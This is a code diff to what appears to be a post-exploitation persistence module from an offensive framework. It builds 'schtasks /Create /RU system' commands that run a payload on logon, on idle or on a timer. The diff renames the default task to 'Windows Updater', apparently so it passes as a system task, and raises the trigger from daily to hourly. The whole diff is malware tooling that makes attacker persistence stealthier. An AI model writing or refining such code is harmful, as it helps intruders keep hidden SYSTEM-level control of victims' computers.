@@ -42,7 +42,7 @@ class Module:
                 'Value'         :   ''
             },
             'DailyTime' : {
-                'Description'   :   'Daily time to trigger the script (HH:mm).',
+                'Description'   :   'Daily time (HH:mm) and every 1 hours to trigger the script.',
                 'Required'      :   False,
                 'Value'         :   '09:00'
             },
@@ -59,7 +59,7 @@ class Module:
             'TaskName' : {
                 'Description'   :   'Name to use for the schtask.',
                 'Required'      :   True,
-                'Value'         :   'Updater'
+                'Value'         :   'Windows Updater'
             },
             'RegPath' : {
                 'Description'   :   'Registry location to store the script code. Last element is the key name.',
@@ -226,15 +226,15 @@ class Module:
             return ""
 
         if onLogon != '':
-            script += "schtasks /Create /F /RU system /SC ONLOGON /TN "+taskName+" /TR "+triggerCmd+";"
+            script += "schtasks /Create /F /RU system /SC ONLOGON /TN \""+taskName+"\" /TR "+triggerCmd+";"
             statusMsg += " with "+taskName+" OnLogon trigger."
         elif idleTime != '':
-            script += "schtasks /Create /F /RU system /SC ONIDLE /I "+idleTime+" /TN "+taskName+" /TR "+triggerCmd+";"
+            script += "schtasks /Create /F /RU system /SC ONIDLE /I "+idleTime+" /TN \""+taskName+"\" /TR "+triggerCmd+";"
             statusMsg += " with "+taskName+" idle trigger on " + idleTime + "."
         else:
             # otherwise assume we're doing a daily trigger
 	    
-            script += "schtasks /Create /F /RU system /SC DAILY /ST "+dailyTime+" /TN "+taskName+" /TR "+triggerCmd+";"
+            script += "schtasks /Create /F /RU system /SC HOURLY /MO 1 /ST "+dailyTime+" /TN \""+taskName+"\" /TR "+triggerCmd+";"
             statusMsg += " with "+taskName+" daily trigger at " + dailyTime + "."
         script += "'Schtasks persistence established "+statusMsg+"'"
 
